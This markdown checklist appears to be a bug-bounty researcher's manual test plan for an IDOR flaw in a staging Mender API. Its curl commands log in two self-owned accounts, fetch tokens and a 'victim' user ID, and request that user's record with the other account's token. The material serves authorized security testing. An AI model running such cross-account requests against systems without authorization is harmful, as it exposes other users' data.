# 🔥 MANUAL TESTING - DO THIS NOW

## Step 1: Create accounts (in browser)

1. Open: https://staging.hosted.mender.io
2. Click "Sign up" / "Create account"
3. **Account 1**: your_h1_username@wearehackerone.com
4. **Account 2**: your_h1_username+victim@wearehackerone.com

## Step 2: Get tokens (in terminal)

```bash
# Account 1 token
curl -X POST https://staging.hosted.mender.io/api/management/v1/useradm/auth/login \
  -H "Content-Type: application/json" \
  -H "X-HackerOne-Research: your_username" \
  -d '{"email":"your_email@wearehackerone.com","password":"your_password"}'

# Save token
export TOKEN_A="<paste_token_here>"

# Account 2 token  
curl -X POST https://staging.hosted.mender.io/api/management/v1/useradm/auth/login \
  -H "Content-Type: application/json" \
  -H "X-HackerOne-Research: your_username" \
  -d '{"email":"your_email+victim@wearehackerone.com","password":"password2"}'

export TOKEN_B="<paste_token_here>"
```

## Step 3: Get user IDs

```bash
# Get Account 2 user ID (VICTIM)
curl -s https://staging.hosted.mender.io/api/management/v1/useradm/users/me \
  -H "Authorization: Bearer $TOKEN_B" \
  -H "X-HackerOne-Research: your_username" | jq -r '.id'

export VICTIM_USER_ID="<paste_id_here>"
```

## Step 4: 🚨 CRITICAL IDOR TEST

```bash
# Can Account 1 access Account 2's data?
curl -v https://staging.hosted.mender.io/api/management/v1/useradm/users/$VICTIM_USER_ID \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "X-HackerOne-Research: your_username"

# If you get HTTP 200 → 🚨 CRITICAL VULNERABILITY!
# If you get HTTP 403/404 → Protected (expected)
```

## Step 5: Run automation

```bash
python3 scripts/test_idor.py
# Enter tokens when prompted
```
